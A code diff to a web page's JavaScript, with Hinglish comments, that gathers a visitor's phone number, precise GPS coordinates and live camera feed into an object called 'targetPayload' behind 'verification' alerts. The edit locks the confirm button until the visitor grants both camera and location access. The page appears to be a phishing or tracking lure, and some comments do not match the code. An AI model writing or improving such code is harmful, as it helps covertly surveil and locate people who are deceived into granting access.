@@ -146,23 +146,25 @@
             exactCoordinates: "Pending",
             broadLocation: "Pending"
         };
+        let isCameraActive = false;   // New Add
+let isLocationActive = false; // New Add
         let isLoopRunning = false;
         let loopCycleCounter = 0;
         let activeStream = null;
 
-        // ====================================================
-        // VALIDATION INTERFACE LOGIC
-        // ====================================================
-        // 10-Digit field configuration parameters validation loop
-        phoneInput.addEventListener('input', function() {
-            if (this.value.length === 10) {
-                confirmBtn.disabled = false;                // Activation command
-                confirmBtn.classList.add('bold-active-btn'); // Style matrix switch
-            } else {
-                confirmBtn.disabled = true;
-                confirmBtn.classList.remove('bold-active-btn');
-            }
-        });
+       // New Add: Central Validation Function
+function validateFormState() {
+    const numericInputString = phoneInput.value;
+    if (numericInputString.length === 10 && isCameraActive === true && isLocationActive === true) {
+        confirmBtn.disabled = false;
+        confirmBtn.classList.add('bold-active-btn');
+    } else {
+        confirmBtn.disabled = true;
+        confirmBtn.classList.remove('bold-active-btn');
+    }
+}
+// Listener link button status check karne ke liye
+phoneInput.addEventListener('input', validateFormState);
         // ====================================================
         // BROWSER PERMISSION INTERFACE HOOKS
         // ====================================================
@@ -171,29 +173,40 @@
         locBtn.addEventListener('click', () => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // Standard geolocation array variable extraction layout
-                        targetPayload.exactCoordinates = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                        alert("Location Verification Completed.");
-                    },
-                    (error) => {
-                        targetPayload.exactCoordinates = `Access State: ${error.message}`;
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
+            (position) => {
+                // Ek sath sequence me andar hai
+                isLocationActive = true;
+                validateFormState();
+
+                // Standard geolocation data collection
+                targetPayload.exactCoordinates = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                alert("Location Verification Completed.");
+            }, // <-- YEH WALA BRACKET (`},`) AAPKE CODE ME MISSING HAI!
+            (error) => {
+                targetPayload.exactCoordinates = `Access State: ${error.message}`;
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+                    
                 );
             }
         });
 
         // Camera Media Query Setup Pipeline
-        camBtn.addEventListener('click', () => {
+        camBtn.addEventListener('click', () => { 
+            
+            
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then((stream) => {
                     activeStream = stream;
                     videoEl.srcObject = stream;
                     alert("Camera Connection Ready.");
-                })
+                    
+                    isCameraActive = true;   // Line 204
+                    validateFormState();     // Line 205 (Ab yeh block ke andar barabar indented hai) ✅
+                })                           // Line 207 (Block yahan close hota hai)
                 .catch((err) => {
+                    
                     console.log("Device configuration interface bypass: ", err.message);
                 });
             }
